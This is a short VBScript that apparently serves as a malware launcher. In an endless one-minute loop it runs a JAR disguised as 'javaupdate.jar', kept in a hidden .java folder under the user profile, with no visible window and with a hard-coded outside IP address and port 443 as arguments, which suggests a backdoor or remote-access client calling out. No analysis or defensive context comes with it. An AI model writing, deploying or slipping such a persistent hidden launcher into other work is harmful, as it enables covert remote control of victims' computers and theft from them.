Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

userProfile = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")
javaUpdaterPath = userProfile & "\.java\javaupdate.jar"
command = "java -jar """ & javaUpdaterPath & """ 20.197.14.25 443"

Do
    If objFSO.FileExists(javaUpdaterPath) Then
        WshShell.Run command, 0, False
    End If
    WScript.Sleep 60000 ' Wait for 1 minute
Loop
